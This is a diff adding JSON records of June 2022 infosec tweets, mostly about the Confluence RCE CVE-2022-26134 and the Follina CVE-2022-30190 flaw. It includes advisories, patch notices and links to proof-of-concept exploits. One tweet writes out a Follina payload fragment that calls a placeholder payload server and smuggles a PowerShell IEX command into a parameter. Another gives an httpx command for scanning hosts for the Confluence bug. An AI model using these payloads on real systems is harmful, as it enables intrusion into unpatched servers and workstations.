+    "tweettime": "2022-06-04, 11:44:13",
+    "tweeturl": "https://twitter.com/S0ufi4n3/status/1533051998077067267",
+    "username": "S0ufi4n3"
+}
+{
+    "tweetfavorites": 366,
+    "tweetquotes": 2,
+    "tweetreplies": 5,
+    "tweetretweets": 108,
+    "tweettext": "CVE-2022-26134  Confluence RCE exploit automation :\n\nhttpx -l list.txt  -paths path.txt  -match-string \"gid=\"",
+    "tweettime": "2022-06-04, 10:00:04",
+    "tweeturl": "https://twitter.com/h4x0r_dz/status/1533025788672593920",
+    "username": "h4x0r_dz"
+}
+{
+    "tweetfavorites": 397,
+    "tweetquotes": 3,
+    "tweetreplies": 10,
+    "tweetretweets": 81,
+    "tweettext": "CVE-2022-26134: Atlassian Confluence RCE PoC\n\n#BugBounty https://t.co/7UFw7TkwME",
+    "tweettime": "2022-06-04, 06:02:51",
+    "tweeturl": "https://twitter.com/sheikhrishad0/status/1532966090841915392",
+    "username": "sheikhrishad0"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134"
+    ],
+    "tweetfavorites": 192,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 64,
+    "tweettext": "Atlassian Confluence (CVE-2022-26134) - Unauthenticated Remote Code Execution (RCE)\nURL：https://t.co/OXIOSvXHL4",
+    "tweettime": "2022-06-04, 04:24:06",
+    "tweeturl": "https://twitter.com/momika233/status/1532941237405499392",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 475,
+    "tweetquotes": 8,
+    "tweetreplies": 2,
+    "tweetretweets": 152,
+    "tweettext": "Thread - Confluence Blind OGNL Injection analysis from our limited java knowledge. From vulnerable sink to becoming admin of the confluence instance. #CVE-2022-26134. Tested on latest vulnerable version 7.18.0.",
+    "tweettime": "2022-06-04, 03:16:31",
+    "tweeturl": "https://twitter.com/httpvoid0x2f/status/1532924231054499840",
+    "username": "httpvoid0x2f"
+}
+{
+    "expanded_url": [
+        "https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134"
+    ],
+    "tweetfavorites": 562,
+    "tweetquotes": 8,
+    "tweetreplies": 2,
+    "tweetretweets": 200,
+    "tweettext": "Very simple POC for Atlassian Confluence Pre-Auth OGNL Injection &amp;&amp; RCE (CVE-2022-26134)\nSetup a pre-built environment to test it in 5 seconds: https://t.co/oH6GJ1mel1\nWhy 5 minutes not 10 seconds? Because you should apply a trial license from Atlassian😂#vulhub https://t.co/CS1EVOHbKg",
+    "tweettime": "2022-06-04, 00:50:44",
+    "tweeturl": "https://twitter.com/phithon_xg/status/1532887542722269184",
+    "username": "phithon_xg"
+}
+{
+    "expanded_url": [
+        "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"
+    ],
+    "tweetfavorites": 98,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 41,
+    "tweettext": "⚠️ CVE-2022-26134 event detected ⚠️\n\nSource IP:\n193.106.191.48 (🇷🇺)\n\nTarget:\nAtlassian Confluence servers vulnerable to unauthenticated remote code execution (https://t.co/mZ6pPfOBws)\n\nLast seen:\n2022-06-03T21:32:10Z\n#threatintel",
+    "tweettime": "2022-06-03, 22:01:05",
+    "tweeturl": "https://twitter.com/bad_packets/status/1532844850298597376",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2022-26134 - Script PoC that exploit the remote code execution vulnerability affecting Atlassian Confluence products 7.18.1 and under. This vulnerability is exploitable without requiring authentication!\n\n#Confluence  #Atlassian #infosec #0day #PoC\nhttps://t.co/HUylvXQ6i0",
+    "tweettime": "2022-06-03, 21:41:53",
+    "tweeturl": "https://twitter.com/Naqwada_/status/1532840017894469632",
+    "username": "Naqwada_"
+}
+{
+    "expanded_url": [
+        "http://go.usa.gov/xJWGw"
+    ],
+    "tweetfavorites": 77,
+    "tweetquotes": 3,
+    "tweetreplies": 5,
+    "tweetretweets": 63,
+    "tweettext": "🚨 Atlassian has released new Confluence Server and Data Center versions to address RCE vulnerability CVE-2022-26134. Update immediately! Read more at https://t.co/wxbzPoWfqi. #Cybersecurity #InfoSec https://t.co/frTQpH4Rax",
+    "tweettime": "2022-06-03, 20:37:59",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1532823934156034048",
+    "username": "USCERT_gov"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/4527"
+    ],
+    "tweetfavorites": 294,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 72,
+    "tweettext": "None-Intrusive @pdnuclei  template for the Confluence RCE vulnerability CVE-2022-26134 is available\n\nhttps://t.co/BGJTz82dmu\n\nConfirmation of hits by DNS callbacks with nslookup to interactsh servers. https://t.co/e42OaNI6mT",
+    "tweettime": "2022-06-03, 20:23:43",
+    "tweeturl": "https://twitter.com/naglinagli/status/1532820345018785792",
+    "username": "naglinagli"
+}
+{
+    "tweetfavorites": 75,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 5,
+    "tweettext": "I wonder if releasing the Confluence RCE patch for CVE-2022-26134 within the weekend was a good idea 🤔 instead of 1 APT exploiting it in the wild now everyone got a working PoC and already mass exploit it 🤡\n\n#BugBounty #infosec",
+    "tweettime": "2022-06-03, 20:15:30",
+    "tweeturl": "https://twitter.com/naglinagli/status/1532818278061641731",
+    "username": "naglinagli"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 208,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 94,
+    "tweettext": "Our technical analysis and curl based PoC for Confluence CVE-2022-26134 can be found here: https://t.co/LUc4286Cj4",
+    "tweettime": "2022-06-03, 19:37:29",
+    "tweeturl": "https://twitter.com/Junior_Baines/status/1532808712070512647",
+    "username": "Junior_Baines"
+}
+{
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 29,
+    "tweettext": "It looks like CVE-2022-26134 (Unauthenticated RCE via OGNL template injection) uses the same vector as CVE-2021-26084.\n\nHere is an attack via CVE-2021-26084 that I was checking on 2022-05-16 that allowed to create a webshell in ./confluence/testAnt.jsp\n\nJust for comparison 🤔 https://t.co/mER1UCe5Ke",
+    "tweettime": "2022-06-03, 19:14:47",
+    "tweeturl": "https://twitter.com/1ZRR4H/status/1532802996362526720",
+    "username": "1ZRR4H"
+}
+{
+    "tweetfavorites": 62,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 20,
+    "tweettext": "There is an RCE PoC for CVE-2022-26134 in this blog post. I haven't tested it yet.",
+    "tweettime": "2022-06-03, 19:12:41",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532802468068962304",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 195,
+    "tweetquotes": 10,
+    "tweetreplies": 2,
+    "tweetretweets": 118,
+    "tweettext": "The Rapid7 team has a root cause analysis of Confluence CVE-2022-26134 out now with thanks to @Junior_Baines. This is an emergency mitigation situation. https://t.co/2G9H6OmJA6",
+    "tweettime": "2022-06-03, 19:05:25",
+    "tweeturl": "https://twitter.com/catc0n/status/1532800640371531777",
+    "username": "catc0n"
+}
+{
+    "tweetfavorites": 102,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 30,
+    "tweettext": "Looking at the patch for Atlassian Confluence CVE-2022-26134 on my lunch break...\n\n-        final String finalNamespace = TextParseUtil.translateVariables(this.namespace, stack);\n-        final String finalActionName = TextParseUtil.translateVariables(this.actionName, stack);\n\n👀",
+    "tweettime": "2022-06-03, 17:11:20",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532771930960445449",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "tweetfavorites": 219,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 82,
+    "tweettext": "This is real. We've confirmed it to work on fully patched Windows. The attack scenario is similar to CVE-2020-1300: get the user to open a CAB file, and a malicious executable is silently copied to their StartUp folder, to be launched the next time they login.",
+    "tweettime": "2022-06-03, 12:43:25",
+    "tweeturl": "https://twitter.com/mkolsek/status/1532704505577541637",
+    "username": "mkolsek"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/06/hackers-exploiting-unpatched-critical.html"
+    ],
+    "tweetfavorites": 134,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 101,
+    "tweettext": "Researchers have uncovered a critical unpatched RCE #vulnerability (CVE-2022-26134) affecting #Atlassian Confluence Server and Data Center products that is being actively exploited by hackers.\n\nRead details: https://t.co/DKvtuJIUr4\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-06-03, 03:44:37",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1532568914151976961",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/NafisiAslH/KnowledgeSharing/tree/main/CyberSecurity/Web/CVEs/CVE-2022/CVE-2022-30190?fbclid=IwAR0UczaWjJNKWTnlvZHCXsWhABuae0kDRKx3hj-wo0LS1y8TZ32HR5w9t3w"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "CVE-2022-30190 : Microsoft Windows Support Diagnostic Tool RCE https://t.co/IztgFGowq9",
+    "tweettime": "2022-06-03, 01:58:06",
+    "tweeturl": "https://twitter.com/_r_netsec/status/1532542109328150528",
+    "username": "_r_netsec"
+}
+{
+    "expanded_url": [
+        "https://blog.reconinfosec.com/analysis-of-exploitation-of-cve-2019-3396"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 13,
+    "tweettext": "For teams dealing with CVE-2022-26134, see this blog post which analyzes a previous Confluence RCE (CVE-2019-3396). It may provide insight into how to approach a breach involving Confluence.\n\nhttps://t.co/A9dKJHktyp",
+    "tweettime": "2022-06-03, 00:54:09",
+    "tweeturl": "https://twitter.com/Recon_InfoSec/status/1532526015188180997",
+    "username": "Recon_InfoSec"
+}
+{
+    "expanded_url": [
+        "https://go.usa.gov/xJDf2"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 16,
+    "tweetreplies": 2,
+    "tweetretweets": 76,
+    "tweettext": "🚨 A RCE Vulnerability (CVE-2022-26134) in Atlassian's Confluence Server and Data Center is being actively exploited. ⛔ Block all internet traffic to and from those devices until an update is available and applied. @CISAgov's KEV now includes this vul: https://t.co/9vliOlJpmd https://t.co/YNltqOCDs7",
+    "tweettime": "2022-06-02, 23:56:11",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1532511428451631108",
+    "username": "USCERT_gov"
+}
+{
+    "tweetfavorites": 36,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 6,
+    "tweettext": "\"When initially analyzing the exploit, Volexity noted it looked similar to previous vulnerabilities that have also been exploited in order to gain remote code execution.\"\n\n\"It should also be noted that CVE-2022-26134 appears to be another command injection vulnerability.\"\n\n👀",
+    "tweettime": "2022-06-02, 23:03:53",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532498264242769925",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"
+    ],
+    "tweetfavorites": 227,
+    "tweetquotes": 16,
+    "tweetreplies": 7,
+    "tweetretweets": 122,
+    "tweettext": "Atlassian is warning about a zero-day in Confluence (CVE-2022-26134). This is a pre-auth, remote code execution bug. No patch yet. Atlassian credits @Volexity which reported it after responding to different victims who got shells/backdoors via this flaw. https://t.co/3AgnpQ1fB3",
+    "tweettime": "2022-06-02, 22:40:49",
+    "tweeturl": "https://twitter.com/briankrebs/status/1532492461939085329",
+    "username": "briankrebs"
+}
+{
+    "tweetfavorites": 99,
+    "tweetquotes": 6,
+    "tweetreplies": 4,
+    "tweetretweets": 28,
+    "tweettext": "Whomp whomp “Confluence Security Advisory 2022-06-02\nConfluence Server and Data Center - CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability” https://t.co/LdcjCdNVSa",
+    "tweettime": "2022-06-02, 21:54:54",
+    "tweeturl": "https://twitter.com/HackingLZ/status/1532480905335345152",
+    "username": "HackingLZ"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/1/is-exploiting-a-null-pointer-deref-for-lpe-just-a-pipe-dream"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 39,
+    "tweettext": "Is exploiting a null pointer deref for LPE just a pipe dream? @izobashi shows the process discovering a couple of #Bitdefender AV bugs (CVE-2021-4198/CVE-2021-4199). The exploit leads to LPE by exploiting a link following issue. https://t.co/YH9f35RU6W",
+    "tweettime": "2022-06-02, 15:15:54",
+    "tweeturl": "https://twitter.com/thezdi/status/1532380491311108096",
+    "username": "thezdi"
+}
+{
+    "tweetfavorites": 248,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 91,
+    "tweettext": "🎁 PoC for a Post-Auth SQL-Injection (CVE-2022-0757) in Nexpose Vulnerability Scanner &lt;= 6.6.128\n\nDefault port: 3780\nDefault username: nxadmin\nAffected handler: /data/asset/filterAssets\n\nFull Request ⤵️ https://t.co/Fi403Zjk9a",
+    "tweettime": "2022-06-02, 14:24:10",
+    "tweeturl": "https://twitter.com/ptswarm/status/1532367472241909760",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "http://dlvr.it/SRV16J"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 24,
+    "tweettext": "CVE-2022-1972: out-of-bound write in Linux netfilter subsystem leads to local privilege escalation: Posted by 张子明(明程) on Jun 02Hello,\n \n An out-of-bound write vulnerability was identified within the\n netfilter subsystem\n which can be exploited to… https://t.co/lLqUCOykeo",
+    "tweettime": "2022-06-02, 10:58:01",
+    "tweeturl": "https://twitter.com/oss_security/status/1532315596653596672",
+    "username": "oss_security"
+}
+{
+    "expanded_url": [
+        "https://github.com/PwnC00re/PoC-CVE-2022-30190?fbclid=IwAR07oJZ7iL0ZyuAXNOflJyttKodx7Tba9Zmp_38ulPpZHpi6GgCc4eYMxZg"
+    ],
+    "tweetfavorites": 327,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 138,
+    "tweettext": "0-day [CVE-2022-30190] MS Offic RCE aka msdt follina\n\nTarget = \"http://&lt;payload_server&gt;/payload.html!\"\nTargetMode = \"External\"\n\nIT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../Windows/System32\n\nhttps://t.co/Bci6gVBWJn https://t.co/hc2TcRoOQt",
+    "tweettime": "2022-06-02, 02:35:49",
+    "tweeturl": "https://twitter.com/wugeej/status/1532189210425577472",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://tcm-sec.com/follina-rce-exploitation-cve-2022-30190/"
+    ],
+    "tweetfavorites": 148,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "Let's learn more about the newest exploit going around, Follina RCE - CVE-2022-30190.  Joe Helle takes us through and shows us a couple ways this exploitation works and what you can do to remedy this current issue.\n\nhttps://t.co/uvIHdUi8QP\n\n#follina #cve #exploitation https://t.co/uXciZocib3",
+    "tweettime": "2022-06-01, 17:29:42",
+    "tweeturl": "https://twitter.com/thecybermentor/status/1532051776651788293",
+    "username": "thecybermentor"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/horde-webmail-rce-via-email/"
+    ],
+    "tweetfavorites": 74,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 30,
+    "tweettext": "⚠️ Horde Webmail is affected by an unpatched code vulnerability (CVE-2022-30287) that allows attackers to take over the mail server when a malicious email is opened. Learn more from our security research:\n\nhttps://t.co/bgpUsljVR3\n\n#appsec #security #vulnerability",
+    "tweettime": "2022-06-01, 15:22:41",
+    "tweeturl": "https://twitter.com/SonarSource/status/1532019810619559939",
+    "username": "SonarSource"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-806/"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "[ZDI-22-806|CVE-2022-23088] FreeBSD 802.11 Network Subsystem Heap-based Buffer Overflow Remote Code Execution Vulnerability (CVSS 8.3) https://t.co/llalKSSlaZ",
+    "tweettime": "2022-06-01, 14:45:14",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1532010387062894592",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://blog.0patch.com/2022/06/free-micropatches-for-follina-microsoft.html"
+    ],
+    "tweetfavorites": 63,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 36,
+    "tweettext": "Free Micropatches For \"Follina\" Microsoft Diagnostic Tool Remote Code Execution 0day (CVE-2022-30190) #Follina\nhttps://t.co/lyNPrgdObJ https://t.co/6UABGE6qor",
+    "tweettime": "2022-06-01, 14:30:17",
+    "tweeturl": "https://twitter.com/0patch/status/1532006627225784323",
+    "username": "0patch"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/22/e/patch-your-wso2-cve-2022-29464-exploited-to-install-linux-compatible-cobalt-strike-beacons-other-malware.html"
+    ],
+    "tweetfavorites": 86,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "Trend Micro has a report out on the recent attacks targeting CVE-2022-29464, a remote code execution vulnerability in WSO2 servers\n\nhttps://t.co/DYFAGxkiQn https://t.co/EQotRJbkyu",
+    "tweettime": "2022-06-01, 08:43:00",
+    "tweeturl": "https://twitter.com/campuscodi/status/1531919227539570690",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://twitter.com/cyb3rops/status/1531154093451902978"
+    ],
+    "tweetfavorites": 125,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 40,
+    "tweettext": "1/ The exploitation of CVE-2022-30190 #Follina isn’t hard to detect\n\nIn fact, proc creation logs with parent info are enough\nhttps://t.co/fH8Ww1f6JA\n\nIt also isn’t hard to apply the workaround via GPO\n\nThe problem with this 0day is that 99% of the possible victims …",
+    "tweettime": "2022-06-01, 06:24:57",
+    "tweeturl": "https://twitter.com/cyb3rops/status/1531884486341840897",
+    "username": "cyb3rops"
+}
